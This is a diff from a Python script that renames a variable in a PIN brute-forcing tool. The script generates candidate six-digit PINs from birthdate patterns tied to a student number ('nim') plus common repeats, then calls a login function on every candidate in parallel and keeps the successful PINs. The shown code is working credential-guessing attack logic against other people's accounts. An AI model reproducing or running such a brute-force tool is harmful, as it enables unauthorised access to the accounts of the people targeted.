@@ -46,7 +46,7 @@ def init_dictionary(nim="160000000"):
     end_year = int(nim[:2]) + 83
 
     start_time = time.time()
-    DICTIONARY = []
+    dictionary = []
     for yy in range(start_year, end_year+1):
         for mm in range(1, 13):
             for dd in range(1, 32):
@@ -54,27 +54,27 @@ def init_dictionary(nim="160000000"):
                     continue
                 if mm in [2, 4, 6, 9, 11] and dd > 30:
                     continue
-                DICTIONARY.append(str(dd).zfill(2)
+                dictionary.append(str(dd).zfill(2)
                                   + str(mm).zfill(2)
                                   + str(yy).zfill(2)[-2:])
-                DICTIONARY.append(str(yy).zfill(2)[-2:]
+                dictionary.append(str(yy).zfill(2)[-2:]
                                   + str(mm).zfill(2)
                                   + str(dd).zfill(2))
     for n in range(0, 1000):
         t = str(n)
-        DICTIONARY.append(t * int(6 / len(t)))
+        dictionary.append(t * int(6 / len(t)))
 
     # put extra values here
-    DICTIONARY += [
+    dictionary += [
         "123456",
         "654321",
     ]
-    DICTIONARY = list(set(DICTIONARY))
+    dictionary = list(set(dictionary))
     total_time = time.time()-start_time
 
     logging.debug("Dictionary generated {} values in {:0.2f}s for {}"
-                  .format(len(DICTIONARY), total_time, nim))
-    return DICTIONARY
+                  .format(len(dictionary), total_time, nim))
+    return dictionary
 
 
 def login(pin, depth=0):
@@ -129,9 +129,9 @@ def brute(nim):
             logging.warning('Saved pin is bad, trying normal method.')
             os.remove(filename)
 
-    DICTIONARY = init_dictionary(nim)
+    dictionary = init_dictionary(nim)
     with multiprocessing.Pool(PROCESS_COUNT) as pool:
-        result = list(pool.map(login, DICTIONARY))
+        result = list(pool.map(login, dictionary))
 
     result = list(set(result))
     result.remove(None)
